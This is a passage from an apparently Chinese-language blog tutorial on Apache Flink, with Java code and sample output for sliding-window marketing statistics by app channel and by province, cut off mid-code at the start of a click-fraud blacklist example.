count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;wechat&#x27;, behavior=&#x27;INSTALL&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;INSTALL&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;app store&#x27;, behavior=&#x27;DOWNLOAD&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=10&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;CLICK&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=2&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;app store&#x27;, behavior=&#x27;CLICK&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=9&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码3-不分渠道代码实现"><a href="#代码3-不分渠道代码实现" class="headerlink" title="代码3-不分渠道代码实现"></a>代码3-不分渠道代码实现</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ChannelPromotionCount;</span><br><span class="line"><span class="keyword">import</span> beans.MarketingUserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 6:19 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMarketingStatistics</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从自定义数据源中读取数据</span></span><br><span class="line">    DataStream&lt;MarketingUserBehavior&gt; dataStream = env.addSource(<span class="keyword">new</span> AppMarketingByChannel.SimulatedMarketingUserBehaviorSource())</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;MarketingUserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(MarketingUserBehavior element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 开窗统计总量</span></span><br><span class="line">    DataStream&lt;ChannelPromotionCount&gt; resultStream = dataStream</span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;UNINSTALL&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;MarketingUserBehavior, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title">map</span><span class="params">(MarketingUserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="string">&quot;total&quot;</span>, <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .keyBy(tuple2 -&gt; tuple2.f0)</span><br><span class="line">      <span class="comment">// 定义滑窗</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> MarketingStatisticsAgg(), <span class="keyword">new</span> MarketingStatisticsResult());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;app marketing by channel job&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的模拟市场用户行为数据源</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SimulatedMarketingUserBehaviorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 控制是否正常运行的标识位</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义用户行为和渠道的范围</span></span><br><span class="line">    List&lt;String&gt; behaviorList = Arrays.asList(<span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;DOWNLOAD&quot;</span>, <span class="string">&quot;INSTALL&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>);</span><br><span class="line">    List&lt;String&gt; channelList = Arrays.asList(<span class="string">&quot;app store&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;weibo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="comment">// 随机生成所有字段</span></span><br><span class="line">        Long id = random.nextLong();</span><br><span class="line">        String behavior = behaviorList.get(random.nextInt(behaviorList.size()));</span><br><span class="line">        String channel = channelList.get(random.nextInt(channelList.size()));</span><br><span class="line">        Long timestamp = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发出数据</span></span><br><span class="line">        ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(id, behavior, channel, timestamp));</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">100L</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的增量聚合函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingStatisticsAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Long</span>&gt;, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(Tuple2&lt;String, Long&gt; value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的全窗口函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingStatisticsResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">ChannelPromotionCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String s, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;ChannelPromotionCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(window.getEnd()).toString();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> ChannelPromotionCount(<span class="string">&quot;total&quot;</span>, <span class="string">&quot;total&quot;</span>, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beans.ChannelPromotionCount&#123;channel=<span class="string">&#x27;total&#x27;</span>, behavior=<span class="string">&#x27;total&#x27;</span>, windowEnd=<span class="string">&#x27;2021-02-05 18:34:15.0&#x27;</span>, count=<span class="number">40</span>&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=<span class="string">&#x27;total&#x27;</span>, behavior=<span class="string">&#x27;total&#x27;</span>, windowEnd=<span class="string">&#x27;2021-02-05 18:34:20.0&#x27;</span>, count=<span class="number">75</span>&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=<span class="string">&#x27;total&#x27;</span>, behavior=<span class="string">&#x27;total&#x27;</span>, windowEnd=<span class="string">&#x27;2021-02-05 18:34:25.0&#x27;</span>, count=<span class="number">109</span>&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h5 id="市场营销分析——页面广告统计"><a href="#市场营销分析——页面广告统计" class="headerlink" title="市场营销分析——页面广告统计"></a>市场营销分析——页面广告统计</h5><ul><li>基本需求 <ul><li>从埋点日志中，统计每小时页面广告的点击量，5秒刷新一次，并按照不同省份进行划分</li><li>对于”刷单”式的频繁点击行为进行过滤，并将该用户加入黑名单</li></ul></li><li>解决思路 <ul><li>根据省份进行分组，创建长度为1小时、滑动距离为5秒的时间窗口进行统计</li><li>可以用<code>process function</code>进行黑名单过滤，检测用户对同一广告的点击量，如果超过上限则将用户信息以侧输出流输出到黑名单中</li></ul></li></ul><h6 id="POJO-3"><a href="#POJO-3" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> AdClickEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> Long adId;</span><br><span class="line"><span class="keyword">private</span> String province;</span><br><span class="line"><span class="keyword">private</span> String city;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> BlackListUserWarning  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> Long adId;</span><br><span class="line"><span class="keyword">private</span> String warningMsg;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码1-基本实现"><a href="#代码1-基本实现" class="headerlink" title="代码1-基本实现"></a>代码1-基本实现</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.AdClickEvent;</span><br><span class="line"><span class="keyword">import</span> beans.AdCountViewByProvince;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 6:41 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdStatisticsByProvince</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从文件中读取数据</span></span><br><span class="line">    URL resource = AdStatisticsByProvince.class.getResource(<span class="string">&quot;/AdClickLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;AdClickEvent&gt; adClickEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AdClickEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), fields[<span class="number">2</span>], fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;AdClickEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(AdClickEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 基于省份分组，开窗聚合</span></span><br><span class="line">    DataStream&lt;AdCountViewByProvince&gt; adCountStream = adClickEventDataStream</span><br><span class="line">      .keyBy(AdClickEvent::getProvince)</span><br><span class="line">      <span class="comment">// 定义滑窗,5min输出一次</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.minutes(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> AdCountAgg(), <span class="keyword">new</span> AdCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    adCountStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;ad count by province job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">AdClickEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(AdClickEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">AdCountViewByProvince</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String province, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;AdCountViewByProvince&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(window.getEnd()).toString();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> AdCountViewByProvince(province, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;beijing&#x27;, windowEnd=&#x27;2017-11-26 09:05:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:05:00.0&#x27;, count=1&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;guangdong&#x27;, windowEnd=&#x27;2017-11-26 09:05:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;guangdong&#x27;, windowEnd=&#x27;2017-11-26 09:10:00.0&#x27;, count=4&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:10:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;beijing&#x27;, windowEnd=&#x27;2017-11-26 09:10:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:15:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;beijing&#x27;, windowEnd=&#x27;2017-11-26 09:15:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;guangdong&#x27;, windowEnd=&#x27;2017-11-26 09:15:00.0&#x27;, count=5&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:20:00.0&#x27;, count=2&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-点击异常行为黑名单过滤"><a href="#代码2-点击异常行为黑名单过滤" class="headerlink" title="代码2-点击异常行为黑名单过滤"></a>代码2-点击异常行为黑名单过滤</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 